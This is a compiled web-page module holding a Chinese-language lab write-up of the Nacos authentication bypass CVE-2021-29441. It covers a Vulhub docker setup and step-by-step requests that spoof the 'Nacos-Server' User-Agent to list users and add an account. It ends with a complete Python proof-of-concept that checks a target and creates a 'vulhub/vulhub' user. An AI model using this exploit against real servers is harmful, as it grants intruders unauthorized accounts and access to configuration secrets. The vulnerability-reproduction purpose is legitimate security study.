import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as p,c as o,a as n,b as s,d as i,e as c}from"./app-58e4a7d6.js";const l={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。",-1),d=n("p",null,"该漏洞发生在 nacos 在进行认证授权操作时，会判断请求的 user-agent 是否为”Nacos-Server”，如果是的话则不进行任何认证。开发者原意是用来处理一些服务端对服务端的请求。但是由于配置的过于简单，并且将协商好的 user-agent 设置为 Nacos-Server，直接硬编码在了代码里，导致了漏洞的出现。并且利用这个未授权漏洞，攻击者可以获取到用户名密码等敏感信息。",-1),k=n("p",null,"参考链接：",-1),v={href:"https://github.com/advisories/GHSA-36hp-jr8h-556f",target:"_blank",rel:"noopener noreferrer"},m=c(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 运行漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境运行后，会开放 3306、8848、9848、9555 端口，在本次漏洞利用中，我们只需要用到 8848 端口，即 web 访问端口。</p><p>执行漏洞验证过程时，请先访问 8848 端口，确认开放，某些情况下 nacos 服务会启动失败（无法连接数据库导致），可以重启 nacos 服务或者重启所有服务。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose restart nacos
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>漏洞利用过程如下：</p><ol><li>修改 User-Agent 的值为 Nacos-Server 到请求包中</li><li>访问 <code>http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</code> 查看状态码是否为 200，且内容中是否包含 <code>pageItems</code></li><li>使用 POST 方式访问 <code>http://target:8848/nacos/v1/auth/users?username=vulhub&amp;password=vulhub</code> 添加一个新用户</li><li>访问 <code>http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</code> 获取已有的用户列表</li><li>访问 <code>http://target:8848/nacos/</code>，使用添加的新用户 (vulhub/vulhub) 进行登录</li></ol><p><strong>检测漏洞是否存在</strong></p><p>添加 Header 头后访问 <code>http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</code> 可以看到返回值为 200，且内容中是否包含 <code>pageItems</code>。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262300141.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><strong>添加新用户</strong></p><p>添加 Header 头后使用 <code>POST</code> 方式请求 <code>http://target:8848/nacos/v1/auth/users?username=test&amp;password=test</code> 添加一个新用户，账号密码都为 <code>test</code>。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262301006.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><strong>使用新建的账号进行登录</strong></p><p>使用账号密码 <code>test/test</code> 登录。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262302898.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞-poc" tabindex="-1"><a class="header-anchor" href="#漏洞-poc" aria-hidden="true">#</a> 漏洞 POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> sys

<span class="token keyword">import</span> requests

headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Nacos-Server&quot;</span>
<span class="token punctuation">}</span>


<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    endpoint <span class="token operator">=</span> <span class="token string">&quot;/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&quot;</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span> <span class="token operator">+</span> endpoint<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token string">&quot;pageItems&quot;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span> target <span class="token operator">+</span> <span class="token string">&quot; has vulnerabilities&quot;</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">print</span> target <span class="token operator">+</span> <span class="token string">&quot;has not vulnerabilities&quot;</span>
    <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token keyword">def</span> <span class="token function">add_user</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    add_user_endpoint <span class="token operator">=</span> <span class="token string">&quot;/nacos/v1/auth/users?username=vulhub&amp;password=vulhub&quot;</span>

    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span> <span class="token operator">+</span> add_user_endpoint<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token string">&quot;create user ok&quot;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">&quot;Add User Success&quot;</span>
        <span class="token keyword">print</span> <span class="token string">&quot;New User Info: vulhub/vulhub&quot;</span>
        <span class="token keyword">print</span> <span class="token string">&quot;Nacos Login Endpoint: {}/nacos/&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">&quot;Add User Failed&quot;</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">&quot;Please specify the target: python poc.py http://xxxxx:8848&quot;</span>
        exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> check<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        add_user<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python poc.py http://target:8848
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262255839.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,22);function g(b,h){const a=t("ExternalLinkIcon");return p(),o("div",null,[r,u,d,k,n("ul",null,[n("li",null,[n("a",v,[s("https://github.com/advisories/GHSA-36hp-jr8h-556f"),i(a)])])]),m])}const y=e(l,[["render",g],["__file","Nacos 认证绕过漏洞 CVE-2021-29441.html.vue"]]);export{y as default};
